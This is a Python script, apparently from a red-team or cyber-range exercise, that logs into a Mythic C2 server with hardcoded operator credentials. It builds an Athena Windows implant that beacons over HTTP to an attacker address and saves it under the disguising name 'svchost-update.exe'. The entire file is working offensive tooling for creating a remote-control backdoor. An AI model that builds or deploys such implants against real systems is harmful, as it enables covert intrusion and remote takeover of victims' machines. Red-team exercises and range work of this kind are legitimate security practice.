#!/usr/bin/env python3
# =============================================================================
# Mythic C2 — build (and download) an Athena Windows payload  [VALIDATED]
# Athena is the Windows-capable Mythic agent in this range; the http C2 profile
# listens on the Mythic server (Attacker VLAN :80). The built exe is what the M4
# relay stages onto the CHARLIE host to land the first beacon.
# Run FROM Kali:  pip install mythic --break-system-packages ; python3 create_athena_payload.py
# =============================================================================
import asyncio
from mythic import mythic

SERVER, PORT = "10.3.10.20", 7443
USER, PW = "tlo_operator", "Mythic_TLO_2026!"
CALLBACK_HOST, CALLBACK_PORT = "http://10.3.10.20", 80
OUT = "/tmp/svchost-update.exe"

async def main():
    m = await mythic.login(username=USER, password=PW, server_ip=SERVER,
                           server_port=PORT, ssl=True, timeout=-1)
    print("AUTH-OK operator=%s" % USER)
    resp = await mythic.create_payload(
        mythic=m,
        payload_type_name="athena",
        filename="svchost-update.exe",
        operating_system="Windows",
        c2_profiles=[{
            "c2_profile": "http",
            "c2_profile_parameters": {
                "callback_host": CALLBACK_HOST,
                "callback_port": CALLBACK_PORT,
                "callback_interval": 5,
                "encrypted_exchange_check": True,
            },
        }],
        build_parameters=[
            {"name": "output_type", "value": "WinExe"},
            {"name": "arch", "value": "x64"},
        ],
        return_on_complete=True,
        timeout=300,
    )
    print("BUILD:", resp.get("build_phase"), "uuid:", resp.get("uuid"))
    if resp.get("build_phase") != "success":
        print(str(resp)[:500]); return
    # download the built payload to disk
    data = await mythic.download_payload(mythic=m, payload_uuid=resp["uuid"])
    with open(OUT, "wb") as fh:
        fh.write(data)
    print("SAVED", OUT, len(data), "bytes")

asyncio.run(main())
